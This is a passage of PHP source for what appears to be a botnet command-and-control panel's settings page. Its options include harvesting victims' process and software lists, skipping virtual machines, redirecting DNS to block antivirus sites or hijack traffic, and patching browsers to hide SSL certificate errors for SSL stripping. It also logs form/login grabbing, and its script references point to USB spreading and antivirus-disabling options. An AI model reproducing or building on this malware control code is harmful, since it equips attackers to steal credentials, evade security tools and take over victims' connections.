The bot omits generic system processes, such as svchost.exe, csrss.exe, lsass.exe, and so on. The installed software list blob displays installed software -- The display name of said software, and the installation path. Because all these blobs can be rather large, it is recommended that you only use them if bandwidth is not an issue, or if you need the information. Any blobs that are not checked below will not be sent by the client.\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 10px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_blob_process_list\" style=\"position: relative; top: -2px;\" ";
echo $adv_blobs_process_list_value;
echo ">\n\t\t\t\t\t\t\tProcess list (";
echo $adv_blobs_process_list_value == "checked" ? "ON" : "OFF";
echo ")\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 15px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_blob_software_list\" style=\"position: relative; top: -2px;\" ";
echo $adv_blobs_software_list_value;
echo ">\n\t\t\t\t\t\t\tInstalled software list (";
echo $adv_blobs_software_list_value == "checked" ? "ON" : "OFF";
echo ")\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 20px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_blob_autostart_list\" style=\"position: relative; top: -2px;\" ";
echo $adv_blobs_autostart_list_value;
echo ">\n\t\t\t\t\t\t\tCommon autostart items list (";
echo $adv_blobs_autostart_list_value == "checked" ? "ON" : "OFF";
echo ")\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 25px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_blob_generic\" style=\"position: relative; top: -2px;\" ";
echo $adv_blobs_generic_value;
echo ">\n\t\t\t\t\t\t\tGeneric information (";
echo $adv_blobs_generic_value == "checked" ? "ON" : "OFF";
echo ")\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 30px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_blob_debug\" style=\"position: relative; top: -2px;\" ";
echo $adv_blobs_debug_value;
echo ">\n\t\t\t\t\t\t\tDebug information (";
echo $adv_blobs_debug_value == "checked" ? "ON" : "OFF";
echo ")\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n    </div>\n\t\n    <div id=\"pane4\" class=\"tab-pane ";
echo $active_pane == 4 ? "active" : "";
echo "\">\n\t\t<!-- Security/blacklist settings -->\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Security settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<!-- Special login security code -->\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t<b>Login page security code:</b>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<img src=\"img/secode.jpg\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -5px;\">Special login page security code <i>(Optional)</i>:&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"secure_code\" value=\"";
echo $sqlSettings->SecureCode;
echo "\" style=\"position: relative; top: -1px; width: 125px; height: 13px; font-size: 10px; face: font-family: Tahoma; ";
echo $secure_code_fix;
echo "\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -5px;\">&nbsp;&nbsp;[ <a id=\"login_sec_code\" rel=\"popover\" data-placement=\"bottom\" data-content=\"This is a special code that, if set, will be required in the login page link. If you find someone is attempting to brute force an account or otherwise attack your panel, you can add this security code for extra measure. This will only display/accept login attempts if the link contains the security code you enter here, in the following format:<br /><br />login.php?sc=<i>special security code here</i><br /><br />A string no longer than 16 alphanumeric characters is accepted. Leave this area empty if you do <strong>not</strong> want to use a special security code.\" data-original-title=\"\" href=\"#\">?</a> ]</span>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"blacklist_enable\" style=\"position: relative; top: -2px\" ";
echo $blacklist_status_value;
echo ">\n\t\t\t\t\t\tEnable IP Blacklist\n\t\t\t\t\t</label>\n\t\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\t\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"blacklist_suspicious_queries\" style=\"position: relative; top: -2px\" ";
echo $blacklist_proactive_value;
echo ">\n\t\t\t\t\t\tBlacklist hosts executing suspicious queries\n\t\t\t\t\t</label>\n\t\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"blacklist_tor\" style=\"position: relative; top: -2px\" ";
echo $blacklist_tor_value;
echo ">\n\t\t\t\t\t\tBlacklist TOR IPs\n\t\t\t\t\t</label>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t<b>Gate filters:</b>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"security_disable_gateway\" style=\"position: relative; top: -2px\" ";
echo $security_disable_gateway_value;
echo ">\n\t\t\t\t\t\t\t\t\tDisable bot communications gateway &nbsp;&nbsp;[ <font color=\"#E80000\">Disabling the gateway will prevent any bots from communicating with the panel until re-enabled</font> ]\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"security_disable_vm_contacts\" style=\"position: relative; top: -2px\" ";
echo $security_ignore_vm_value;
echo ">\n\t\t\t\t\t\t\t\t\tIgnore communications from virtual machines\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tIgnore communications from countries <i>(Provide ISO-2 country codes separated only by a comma. For example: &nbsp;ES, RU, KZ, KR)</i>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"ignore_locales\" value=\"";
echo str_replace(",", ", ", $sqlSettings->Ignored_Locales);
echo "\" style=\"position: relative; top: 3px; width: 680px; height: 13px; font-size: 10px; face: font-family: Tahoma; ";
echo $ignored_locales_fix;
echo "\">\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<input data-toggle=\"modal\" type=\"button\" class=\"btn btn-success\" href=\"#blacklist_edit\" value=\"Modify IP Blacklist\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t<input value=\"Clear failed logins count\" type=\"submit\" name=\"clear_failed_logins\" class=\"btn btn-primary\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n    </div>\n    <div id=\"pane5\" class=\"tab-pane ";
echo $active_pane == 5 ? "active" : "";
echo "\">\n\t\t";
$dns_background_color = "";
if (isset($_GET["hi"]) && $_GET["hi"] == "dns") {
    $dns_background_color = "background-color: #DBEADC;";
}
echo "\n\t\t<!-- DNS Records Modification settings -->\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"";
echo $dns_background_color;
echo "\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Bot Domain/IP Modification List</font></strong</td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<!--<a id=\"dns_modify_help\" rel=\"popover\" data-placement=\"bottom\" data-content=\"Using this feature, you can cause domain name lookups on the client computers to be redirected to your own custom IP address. Also available is targeting via wildcards (*). For example, this entry: <br /><br />*domain* 127.0.0.1<br /><br />Would cause all domain name lookups with the phrase <i>domain</i> in it to be redirected to IP 127.0.0.1\" data-original-title=\"\" href=\"#\">What is this?</a>\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />-->\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 1000px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 7px; top: -4px;\">\n\t\t\t\t\t\t\t\t\t<table class=\"table\" style=\"width: 970px; position: relative; top: -1px;\">\n\t\t\t\t\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"100%\" style=\"border: 0px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<strong>Domain Name Modifier:</strong>\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 15px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\tThis allows you to change what IP <i>(IPv4 currently)</i> a domain resolves to. By doing this, you can block access to websites (Such as AntiVirus-related / PC Support websites), or redirect websites to your own IP/Server. This is useful for a wide range of activities. Wild cards are allowed. Example: <i>*yahoo* &nbsp;195.2.67.201</i>  - This would cause any domain with the word \"yahoo\" in it to resolve to <i>195.2.67.201</i> &nbsp;(Note: Only the asterik (*) wild card is allowed. REGEX is not supported)\n\t\t\t\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 6px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t<strong>IP Redirector</strong>\n\t\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 15px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tThis allows you to redirect connection attempts to either a single, specific IP, or a range of IPs. This is useful for hijacking connections to servers other than web servers, or by hijacking a connection to a website that uses an IP as its address, rather than a domain name. The redirection is transparent, and programs affected by this feature will think they are connecting to the original IP, but will in fact be connected to the IP you specified. Additionally, you can target a range of IP addresses by using wild cards. Example: <i>82.106.241.* &nbsp; 195.2.67.201</i>  - This entry would redirect all connections to any IP between 82.106.241.0 - 82.106.241.255 to the specified IP, <i>195.2.67.201</i> &nbsp;(Note: Only the asterik (*) wild card is allowed. REGEX is not supported)\n\t\t\t\t\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<strong>Modifier Options:</strong>\n\t\t\t\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 5px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 510px; position: relative; top: 4px;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_no_ssl_cert_errors\" style=\"position: relative; top: -1px;\" ";
echo $adv_nosslcertwarnings_value;
echo ">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tDisable browser SSL certificate warnings (";
echo $adv_nosslcertwarnings_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"nosslcert_def\" rel=\"popover\" data-content=\"Disables SSL certificate warnings / errors. This feature was designed to allow other programs to safely modify SSL-protected pages using various means (Such as proxy-based SSL stripping). Various functions related to SSL certificate verification are patched in browser processes to always return success for SSL-related operations, and to not display any errors when validating SSL certificates.<br /><br /><i>Note: Currently only working in Internet Explorer</i>\" data-original-title=\"\" href=\"#\">?</a> ] &nbsp;&nbsp;<i>(Currently only working for Internet Explorer)</i>\n\t\t\t\t\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t\t\t\t</table>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t<br />\n\t\t\t\t\t<table style=\"border: hidden;\" width=\"350\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"250\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\tNumber of domains being modified:\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"100\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\t";
echo $domains_being_modified_string;
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"250\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\tNumber of IPs being redirected:\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"100\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\t";
echo $ips_being_modified_string;
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"150\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\tNumber of unused domain/IP modification entries:\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"100\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\t";
echo $domip_entries_left_string;
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t<br />\n\t\t\t\t\t<input id=\"dns_mod_focus\" data-toggle=\"modal\" type=\"button\" class=\"btn btn-success\" href=\"#dnsmodifym\" value=\"Modify Domain/IP List\" style=\"font-size: 10px; face: font-family: Tahoma; padding: 6px 22px;\">\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n    </div>\n\n    <div id=\"pane6\" class=\"tab-pane ";
echo $active_pane == 6 ? "active" : "";
echo "\">\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"";
echo $dns_background_color;
echo "\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Event logs</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t";
if ((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS) {
    echo "\t\t\t\t\t<label class=\"checkbox\" style=\"width: 490px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_enable\" style=\"position: relative; top: -2px\" ";
    echo $event_enabled_value;
    echo ">\n\t\t\t\t\t\tEnable event logging &nbsp;&nbsp;[ <font color=\"#E80000\">Enabling logs can put you at risk should the log data be compromised</font> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; top: 0px; width: 160px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_mask_ips\" style=\"position: relative; top: -1px\" ";
    echo $event_mask_ips_value;
    echo ">\n\t\t\t\t\t\tMask stored IP addresses\n\t\t\t\t\t</label>\n\t\t\t\t\t<table class=\"table-condensed\" valign=\"top\" align=\"center\" width=\"100%\" style=\"";
    echo $dns_background_color;
    echo "\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"10%\">\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_logins\" style=\"position: relative; top: -2px\" ";
    echo $event_e_logins_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog successful logins\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_tasks\" style=\"position: relative; top: -2px\" ";
    echo $event_e_tasks_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog new task creation\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_settings\" style=\"position: relative; top: -2px\" ";
    echo $event_e_settings_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog settings changes\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_users\" style=\"position: relative; top: -2px\" ";
    echo $event_e_users_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog new user creation\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_user_modify\" style=\"position: relative; top: -2px\" ";
    echo $event_e_user_modify_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog user modification\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -1px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_task_edit\" style=\"position: relative; top: -2px\" ";
    echo $event_e_task_edit_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog task edits\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"90%\" style=\"border: hidden;\">\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -12px; width: 110px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_task_delete\" style=\"position: relative; top: -2px\" ";
    echo $event_e_task_delete_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog task deletion\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -12px; width: 190px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_fg_filters_modify\" style=\"position: relative; top: -2px\" ";
    echo $event_e_fg_filters_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog Formgrab filter modifications\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -12px; width: 190px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_grabber_status\" style=\"position: relative; top: -2px\" ";
    echo $event_e_grabber_status_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog form/login grabber status changes\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -12px; width: 170px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_fs_modify\" style=\"position: relative; top: -2px\" ";
    echo $event_e_fs_modify_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog FileSearch config changes\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"position: relative; left: 4px; top: -12px; width: 170px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"log_e_db_actions\" style=\"position: relative; top: -2px\" ";
    echo $event_e_db_actions_value;
    echo ">\n\t\t\t\t\t\t\t\t\tLog database maintenance actions\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\n\t\t\t\t\t<br />\n\t\t\t\t\t<!-- Bot list table -->\n\t\t\t\t\t<!--\t\t\t\t\t\t\t\t<th width=\"40\">Event type</th>\n\t\t\t\t\t\t\t\t<th style =\"width: 20px;\">Username</th>\n\t\t\t\t\t\t\t\t<th width=\"10\">IP Address</th>\n\t\t\t\t\t\t\t\t<th width=\"30\">Date</th>\n\t\t\t\t\t\t\t\t<th width=\"260\">Extended information</th>-->\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" valign=\"top\" style=\"width: 1140px;\">\n\t\t\t\t\t\t<thead>\n\t\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<th style =\"width: 65px;\">Event type</th>\n\t\t\t\t\t\t\t\t<th style =\"width: 20px;\">Username</th>\n\t\t\t\t\t\t\t\t<th style =\"width: 20px;\">IP Address</th>\n\t\t\t\t\t\t\t\t<th style =\"width: 75px;\">Date</th>\n\t\t\t\t\t\t\t\t<th style =\"width: 360px;\">Extended information</th>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</thead>\n\t\t\t\t\t\t<tbody>\n\t\t\t\t\t\t\t";
    $max_logs_per_page = 15;
    $current_log_page = isset($_GET["logs_page"]) ? (int) $_GET["logs_page"] : 1;
    $current_item = ($current_log_page - 1) * $max_logs_per_page;
    $total_logs = 0;
    $all_logs = $sqlLogs->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".exlogs");
    if ($all_logs) {
        list($total_logs) = mysql_fetch_row($all_logs);
        mysql_free_result($all_logs);
        $all_logs = NULL;
        $all_logs = $sqlLogs->Query("SELECT * FROM " . SQL_DATABASE . ".exlogs ORDER BY create_date DESC LIMIT " . $current_item . ", " . $max_logs_per_page);
    }
    if ($all_logs) {
        while ($current_row = @mysql_fetch_assoc($all_logs)) {
            $event_type_name = htmlspecialchars($sqlLogs->EventTypeToString($current_row["event_type"]));
            $user_name = htmlspecialchars($current_row["username"]);
            $ip_addr = htmlspecialchars($current_row["ip_addr"]);
            $cdate = date("m/d/Y h:i:s a", $current_row["create_date"]);
            $ex_data = htmlspecialchars($current_row["exdata"]);
            $ex_data = str_replace("&lt;i&gt;", "<i>", $ex_data);
            $ex_data = str_replace("&lt;/i&gt;", "</i>", $ex_data);
            $ex_data = str_replace("&lt;b&gt;", "<i>", $ex_data);
            $ex_data = str_replace("&lt;/b&gt;", "</i>", $ex_data);
            $ex_data = str_replace("&lt;strong&gt;", "<strong>", $ex_data);
            $ex_data = str_replace("&lt;/strong&gt;", "</strong>", $ex_data);
            if (strlen($ex_data) == 0) {
                $ex_data = "<i>N/A</i>";
            }
            echo "<tr>";
            echo "<td>" . $event_type_name . "</td>";
            echo "<td>" . $user_name . "</td>";
            echo "<td>" . $ip_addr . "</td>";
            echo "<td>" . $cdate . "</td>";
            echo "<td>" . $ex_data . "</td>";
            echo "</tr>";
        }
    }
    echo "\t\t\t\t\t\t</tbody>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t";
    _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(false, 1140, "left");
    _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($current_log_page, $max_logs_per_page, $total_logs, "logs_page");
    _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(false);
    if (0 < $total_logs) {
        echo "<a href=\"" . _obfuscated_0D40242237350D0D1B2A07332116102A1B292C06260422_("&clear_events=true") . "\">Clear event logs</a>";
    }
} else {
    echo "<font color=\"#E80000\">You do not have the proper permissions to view log data.</font>";
}
echo "\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n    </div>\n  </div><!-- /.tab-content -->\n</div><!-- /.tabbable -->\n\n\n<br />\n\n<table class=\"table-condensed\" cellpadding=\"10\" valign=\"top\" align=\"right\" width=\"1000\">\n\t<tr>\n\t\t<td align=\"right\">\n\t\t\t<input type=\"submit\" name=\"save_settings\" class=\"btn btn-primary\" value=\"Save Settings\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t<!--<input type=\"submit\" name=\"default_settings\" class=\"btn\" value=\"Default Settings\" style=\"font-size: 10px; face: font-family: Tahoma;\">-->\n\t\t\t<input type=\"submit\" name=\"go_back\" class=\"btn\" value=\"Go back\" onclick=\"javascript:history.go(-1);\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t</td>\n\t</tr>\n</table>\n</form>\n\n<br />\n<br />\n\n<script>\n\t\$(function ()\n\t{\n\t\t\$(\"#optimize_mainpgrabcount_def\").popover();\n\t\t\$(\"#optimize_hide_graphs_def\").popover();\n\t\t\$(\"#optimize_min_fg_info_def\").popover();\n\t\t\$(\"#optimize_min_stats_def\").popover();\n\t\t\$(\"#debugoutput_def\").popover();\n\t\t\n\t\t\$(\"#avk_disable_ieo_def\").popover();\n\t\t\$(\"#avk_fakewin_def\").popover();\n\t\t\$(\"#avk_disable_services_def\").popover();\n\t\t\$(\"#avk_disable_lua_def\").popover();\n\t\t\$(\"#avk_disable_autoupdates_def\").popover();\n\t\t\n\t\t\$(\"#adv_bot_send_debug_attrib_def\").popover();\n\t\t\$(\"#adv_update_on_checkin_def\").popover();\n\t\t\$(\"#adv_bot_send_debug_msgs_def\").popover();\n\t\t\n\t\t\$(\"#userkit_def\").popover();\n\t\t\$(\"#userkit64_def\").popover();\n\t\t\$(\"#injsvchost_def\").popover();\n\t\t\n\t\t\$(\"#runonce_def\").popover();\n\t\t\$(\"#shellfolder_def\").popover();\n\t\t\$(\"#nosslcert_def\").popover();\n\t\t\n\t\t\$(\"#num_days_dead\").popover();\n\t\t\$(\"#knock_interval\").popover();\n\t\t\$(\"#comms_key\").popover();\n\t\t\$(\"#proactive_def\").popover();\n\t\t\$(\"#proactive_miner_def\").popover();\n\t\t\$(\"#proactive_betabot_def\").popover();\n\t\t\$(\"#aggressive_def\").popover();\n\t\t\$(\"#login_sec_code\").popover();\n\t\t\$(\"#usb_spread\").popover();\n\t\t\$(\"#no_userkit\